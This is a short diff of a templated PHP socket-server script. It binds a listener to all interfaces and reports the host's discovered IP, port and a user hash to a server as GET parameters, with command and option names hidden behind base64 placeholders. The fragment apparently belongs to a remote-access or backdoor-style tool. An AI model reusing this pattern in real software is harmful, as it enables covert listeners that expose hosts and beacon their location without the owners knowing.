@@ -32,7 +32,7 @@ set_time_limit(0);
 ob_implicit_flush();
 
 // Default ip address and port to run on
-$address = lookup_ip();
+$address = '0.0.0.0';
 $port = SS_PORT;
 
 // Global variable for tracking options to send to server as GET params
@@ -40,7 +40,7 @@ global $opts;
 
 // Format for opts to be sent as GET params
 $opts = array(
-    '{{B64_OPT_IP}}' => $address,
+    '{{B64_OPT_IP}}' => lookup_ip(),
     '{{B64_OPT_PORT}}' => $port,
     '{{B64_OPT_HASH}}' => '{{USER_HASH}}'
 );
@@ -176,8 +176,6 @@ function command_exist($cmd) {
 }
 
 function lookup_ip() {
-  return '0.0.0.0';
-  
     for ($i = 0; $i < 10; $i++) {
         $cmd = '{{B64_CMD_IPCONFIG}}' . ' ' . '{{B64_CMD_GETIFADDR}}' . ' ' . '{{B64_STR_INTERFACE_PREFIX}}' . $i;
         $adr = trim(exec($cmd));
